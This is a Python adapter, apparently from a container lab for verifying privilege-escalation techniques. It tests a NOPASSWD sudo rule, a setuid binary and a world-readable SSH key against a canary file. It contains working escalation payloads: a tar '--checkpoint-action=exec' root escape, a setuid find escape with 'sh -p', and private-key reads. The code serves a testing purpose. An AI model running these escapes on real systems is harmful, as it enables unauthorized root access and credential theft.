"""Config-abuse adapter — handles misconfigurations that grant privilege.

Covers:
  sudo_rule       (T1548.003)  — NOPASSWD sudo rule with a shell-escape binary
  suid_binary     (T1548.001)  — setuid-root binary with a shell escape
  credential_read (T1552.001)  — world-readable SSH private key

Each ends by reading the canary as the escalated identity (or verifying file
access for credentials), so ``signal.py`` decides the label.
"""

from __future__ import annotations

from verifier.adapters import (NOT_EXECUTABLE, AdapterResult, RunContext,
                               register)
from verifier.lab import file_mode
from verifier.signal import credential_accessible, escalated


@register("config_abuse")
def config_abuse(ctx: RunContext) -> AdapterResult:
    """Dispatch to the per-check handler based on the technique's ``check`` field."""
    check = ctx.technique["check"]

    if check == "sudo_rule":
        return _sudo_rule(ctx)
    elif check == "suid_binary":
        return _suid_binary(ctx)
    elif check == "credential_read":
        return _credential_read(ctx)
    else:
        return AdapterResult(
            escalated=False,
            evidence=f"unknown check type: {check}",
            raw_cmd=[],
        )


def _sudo_rule(ctx: RunContext) -> AdapterResult:
    """T1548.003 — exploit a NOPASSWD sudo rule with a shell-escape binary.

    Uses tar's ``--checkpoint-action=exec`` to run an arbitrary command as
    root.  The command reads the canary, so a positive means root actually
    reached the protected file.
    """
    canary = ctx.canary_path

    # Prefer an explicit payload_template from scope.yaml; fall back to a
    # generic tar-based shell escape.
    template = ctx.technique.get(
        "payload_template",
        "sudo -n /bin/tar -cf /dev/null /dev/null "
        "--checkpoint=1 --checkpoint-action=exec='cat {canary}'",
    )
    payload = template.format(canary=canary)
    cmd = ["sh", "-c", payload]

    ok, evidence = escalated(
        ctx.host, ctx.start_user, cmd, ctx.canary_token,
        prefix=ctx.container_prefix,
    )
    return AdapterResult(escalated=ok, evidence=evidence, raw_cmd=cmd)


def _suid_binary(ctx: RunContext) -> AdapterResult:
    """T1548.001 — exploit a setuid-root binary with a documented shell escape.

    Unlike a kernel exploit, this needs nothing of the host: the setuid bit is a
    property of a file in the container's own filesystem, so it is genuinely
    executable in a container lab.

    The precondition is checked first. If the setuid bit is not actually set,
    the technique cannot work here and that is reported as not_executable rather
    than as a failure — the same distinction the kernel adapter makes. Running
    it anyway would produce a negative label describing the lab rather than the
    technique.

    A note on the payload: the escape must run `sh -p`. Without it the shell
    drops the euid it inherited from the setuid binary and the command runs
    unprivileged, which looks exactly like the technique not working.
    """
    suid_path = ctx.technique.get("suid_path", "")

    if not suid_path:
        return AdapterResult(
            escalated=False,
            evidence="NOT EXECUTABLE: no suid_path declared in scope.yaml",
            raw_cmd=[],
            status=NOT_EXECUTABLE,
            reason="no suid_path declared in scope.yaml",
        )

    mode = file_mode(ctx.host, suid_path, prefix=ctx.container_prefix)
    if mode is None:
        reason = f"{suid_path} does not exist on {ctx.host}"
        return AdapterResult(
            escalated=False, evidence=f"NOT EXECUTABLE: {reason}",
            raw_cmd=[], status=NOT_EXECUTABLE, reason=reason,
        )
    if not mode.startswith("4"):
        reason = (
            f"{suid_path} on {ctx.host} is mode {mode}; the setuid bit is not "
            f"set, so the escape cannot grant privilege here"
        )
        return AdapterResult(
            escalated=False, evidence=f"NOT EXECUTABLE: {reason}",
            raw_cmd=[], status=NOT_EXECUTABLE, reason=reason,
        )

    template = ctx.technique.get(
        "payload_template",
        "{suid_path} /etc/hostname -exec /bin/sh -p -c 'cat {canary}' \\; -quit",
    )
    payload = template.format(canary=ctx.canary_path, suid_path=suid_path)
    cmd = ["sh", "-c", payload]

    ok, evidence = escalated(
        ctx.host, ctx.start_user, cmd, ctx.canary_token,
        prefix=ctx.container_prefix,
    )
    return AdapterResult(escalated=ok, evidence=evidence, raw_cmd=cmd)


def _credential_read(ctx: RunContext) -> AdapterResult:
    """T1552.001 — read a world-readable SSH private key.

    This is a credential-access check, not a privilege escalation.  Success
    means the file is readable and contains a private key.
    """
    key_path = ctx.technique["key_path"]
    cmd = ["cat", key_path]

    ok, evidence = credential_accessible(
        ctx.host, ctx.start_user, key_path,
        prefix=ctx.container_prefix,
    )
    return AdapterResult(escalated=ok, evidence=evidence, raw_cmd=cmd)
